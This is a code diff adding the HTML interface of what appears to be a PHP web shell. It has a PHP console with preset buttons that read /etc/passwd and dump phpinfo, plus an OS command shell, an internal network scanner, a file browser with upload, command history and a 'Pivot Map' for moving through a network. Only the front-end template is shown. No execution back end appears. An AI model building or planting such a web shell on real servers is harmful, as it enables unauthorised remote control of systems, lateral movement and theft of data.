@@ -1,0 +1,208 @@
+<div class="layout">
+  <!-- Sidebar -->
+  <div class="sidebar">
+    <div class="sidebar-header">&#x1F40A; SHELL</div>
+    <ul class="sidebar-nav">
+      <li><a href="#" class="active" data-tab="console"><span class="icon">&#x1F4BB;</span>Console</a></li>
+<!-- MODULE:scanner -->
+      <li><a href="#" data-tab="scanner"><span class="icon">&#x1F50D;</span>Scanner</a></li>
+<!-- /MODULE:scanner -->
+      <li><a href="#" data-tab="files"><span class="icon">&#x1F4C1;</span>Files</a></li>
+<!-- MODULE:diagnostics -->
+      <li><a href="#" data-tab="diag"><span class="icon">&#x2699;</span>Diagnostics</a></li>
+<!-- /MODULE:diagnostics -->
+<!-- MODULE:history -->
+      <li><a href="#" data-tab="history"><span class="icon">&#x1F4DC;</span>History</a></li>
+<!-- /MODULE:history -->
+<!-- MODULE:pivot -->
+      <li><a href="#" data-tab="pivot"><span class="icon">&#x1F5FA;</span>Pivot Map</a></li>
+<!-- /MODULE:pivot -->
+    </ul>
+    <div style="margin-top:auto;padding:12px;border-top:1px solid var(--border)">
+      <div style="font-size:11px;color:var(--muted);margin-bottom:8px;letter-spacing:.5px">DATABASE</div>
+      <button class="btn btn-sm btn-secondary" onclick="exportDB()" style="width:100%;margin-bottom:6px">&#x2B07; Export DB</button>
+      <button class="btn btn-sm btn-secondary" onclick="document.getElementById('db-import-file').click()" style="width:100%">&#x2B06; Import DB</button>
+      <input type="file" id="db-import-file" accept=".json" style="display:none" onchange="importDB(this)">
+    </div>
+  </div>
+
+  <!-- Main -->
+  <div class="main">
+    <div class="topbar">
+      <span class="path" id="current-path">{{INITIAL_DIR}}</span>
+<!-- MODULE:history -->
+      <button class="btn btn-sm btn-danger" onclick="clearHistory()">Clear History</button>
+<!-- /MODULE:history -->
+    </div>
+    <div class="content">
+
+      <!-- CONSOLE TAB -->
+      <div class="tab-content active" id="tab-console">
+        <div class="card">
+          <div class="card-header">
+            PHP Console
+            <div class="btn-group">
+              <button class="btn btn-sm btn-secondary" onclick="insertCode(&quot;print_r(scandir('.'));&quot;)">scandir</button>
+              <button class="btn btn-sm btn-secondary" onclick="insertCode(&quot;echo file_get_contents('/etc/passwd');&quot;)">/etc/passwd</button>
+              <button class="btn btn-sm btn-secondary" onclick="insertCode(&quot;phpinfo();&quot;)">phpinfo</button>
+              <button class="btn btn-sm btn-secondary" onclick="insertCode(&quot;echo php_uname();&quot;)">uname</button>
+            </div>
+          </div>
+          <div class="card-body">
+            <textarea id="console-input" placeholder="Enter PHP code..."></textarea>
+            <div class="btn-group" style="margin-top:10px">
+              <button class="btn btn-primary" onclick="runCode()">&#x25B6; Execute</button>
+              <button class="btn btn-secondary" onclick="document.getElementById('console-input').value=''">Clear</button>
+            </div>
+          </div>
+        </div>
+        <div class="card" id="output-card" style="display:none">
+          <div class="card-header">
+            Output
+            <div class="btn-group">
+              <button class="btn btn-sm btn-secondary" onclick="copyOutput()">&#x1F4CB; Copy</button>
+              <button class="btn btn-sm btn-secondary" onclick="downloadOutput()">&#x2B07; Download</button>
+            </div>
+          </div>
+          <div class="card-body">
+            <div class="console-output" id="console-output"></div>
+          </div>
+        </div>
+        <!-- OS Shell -->
+        <div class="card" id="os-shell-card" style="display:none">
+          <div class="card-header">
+            OS Shell
+            <div class="btn-group">
+              <span id="os-shell-status"></span>
+              <button class="btn btn-sm btn-secondary" onclick="document.getElementById('os-shell-output').textContent=''">Clear</button>
+            </div>
+          </div>
+          <div class="card-body" style="padding:0">
+            <div class="console-output" id="os-shell-output" style="min-height:200px;max-height:400px;border:none;border-radius:0;margin:0"></div>
+            <div style="display:flex;align-items:center;border-top:1px solid var(--border);padding:8px 12px;background:#0d1117">
+              <span id="os-shell-prompt" style="color:var(--accent);font-family:monospace;font-size:12px;white-space:nowrap;margin-right:8px"></span>
+              <input type="text" id="os-shell-input" class="form-control" placeholder="Enter OS command..." style="flex:1;border:none;background:transparent;color:var(--green);font-family:monospace;font-size:13px;padding:4px 0" autocomplete="off" spellcheck="false">
+            </div>
+          </div>
+        </div>
+      </div>
+
+<!-- MODULE:scanner -->
+      <!-- SCANNER TAB -->
+      <div class="tab-content" id="tab-scanner">
+        <div class="card">
+          <div class="card-header">Network Scanner</div>
+          <div class="card-body">
+            <div class="scan-form">
+              <div class="form-group">
+                <label>CIDR Range</label>
+                <input class="form-control" id="scan-cidr" value="192.168.2.0/24" placeholder="192.168.2.0/24" style="width:180px">
+              </div>
+              <div class="form-group">
+                <label>Ports (e.g. 22,80,443,8000-8100)</label>
+                <input class="form-control" id="scan-port" value="80" placeholder="22,80,443,8000-8100" style="width:220px">
+              </div>
+              <button class="btn btn-primary" onclick="startScan()">&#x1F50D; Scan</button>
+              <button class="btn btn-secondary" onclick="loadScanHistory()">&#x1F4BE; Load Saved</button>
+            </div>
+            <div class="progress-bar-wrap" id="scan-progress-wrap" style="display:none">
+              <div class="progress-bar-fill" id="scan-progress"></div>
+            </div>
+            <div class="scan-status" id="scan-status"></div>
+            <div class="scan-results" id="scan-results"></div>
+          </div>
+        </div>
+        <div class="card" id="saved-scans-card" style="display:none">
+          <div class="card-header">
+            Saved Scan Results
+            <div class="btn-group">
+              <button class="btn btn-sm btn-secondary" onclick="exportScanHistory()">&#x2B07; Export (deduped)</button>
+              <button class="btn btn-sm btn-danger" onclick="clearScanHistory()">Clear All</button>
+            </div>
+          </div>
+          <div class="card-body" id="saved-scans-body"></div>
+        </div>
+      </div>
+<!-- /MODULE:scanner -->
+
+      <!-- FILES TAB -->
+      <div class="tab-content" id="tab-files">
+        <div class="card">
+          <div class="card-header">
+            File Browser
+            <div style="display:flex;align-items:center;gap:8px">
+              <input class="form-control" id="files-path-input" style="width:320px;font-size:12px" value="{{INITIAL_DIR}}">
+              <button class="btn btn-sm btn-primary" onclick="browseDir(document.getElementById('files-path-input').value)">Go</button>
+            </div>
+          </div>
+          <div class="card-body" style="padding:0">
+            <div id="files-body">
+              <div style="padding:16px;color:var(--muted);font-size:13px">Loading...</div>
+            </div>
+          </div>
+          <div id="files-upload-area" style="padding:12px 16px;border-top:1px solid var(--border)">
+            <div style="font-size:12px;color:var(--muted);margin-bottom:6px">Upload to current directory</div>
+            <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+              <input type="file" id="upload-input" style="font-size:13px;color:var(--text)">
+              <button class="btn btn-sm btn-primary" onclick="uploadFile()">&#x2B06; Upload</button>
+            </div>
+            <div id="upload-status" style="font-size:12px;margin-top:6px"></div>
+          </div>
+        </div>
+      </div>
+
+<!-- MODULE:diagnostics -->
+      <!-- DIAGNOSTICS TAB -->
+      <div class="tab-content" id="tab-diag">
+        <div class="card">
+          <div class="card-header">
+            System Diagnostics
+            <button class="btn btn-sm btn-primary" onclick="loadDiag()">&#x1F504; Refresh</button>
+          </div>
+          <div class="card-body" id="diag-body">
+            <div style="color:var(--muted);font-size:13px">Click Refresh to load diagnostics.</div>
+          </div>
+        </div>
+      </div>
+<!-- /MODULE:diagnostics -->
+
+<!-- MODULE:pivot -->
+      <!-- PIVOT MAP TAB -->
+      <div class="tab-content" id="tab-pivot">
+        <div class="card">
+          <div class="card-header">
+            Pivot Map
+            <div class="btn-group">
+              <button class="btn btn-sm btn-primary" onclick="renderPivotMap()">&#x21BB; Refresh</button>
+              <button class="btn btn-sm btn-secondary" onclick="exportScanHistory()">&#x2B07; Export IPs</button>
+            </div>
+          </div>
+          <div class="card-body" id="pivot-summary" style="border-bottom:1px solid var(--border);padding:12px 16px"></div>
+          <div class="card-body" id="pivot-body">
+            <div style="color:var(--muted)">No scan data. Run scans first.</div>
+          </div>
+        </div>
+      </div>
+<!-- /MODULE:pivot -->
+
+<!-- MODULE:history -->
+      <!-- HISTORY TAB -->
+      <div class="tab-content" id="tab-history">
+        <div class="card">
+          <div class="card-header">
+            Command History
+            <div class="btn-group">
+              <button class="btn btn-sm btn-secondary" onclick="exportHistory()">&#x2B07; Export</button>
+              <button class="btn btn-sm btn-danger" onclick="clearHistory()">Clear</button>
+            </div>
+          </div>
+          <div class="card-body" id="history-body">
+            <div style="color:var(--muted);font-size:13px">No history yet.</div>
+          </div>
+        </div>
+      </div>
+<!-- /MODULE:history -->
+
+    </div><!-- /content -->
+  </div><!-- /main -->
+</div><!-- /layout -->
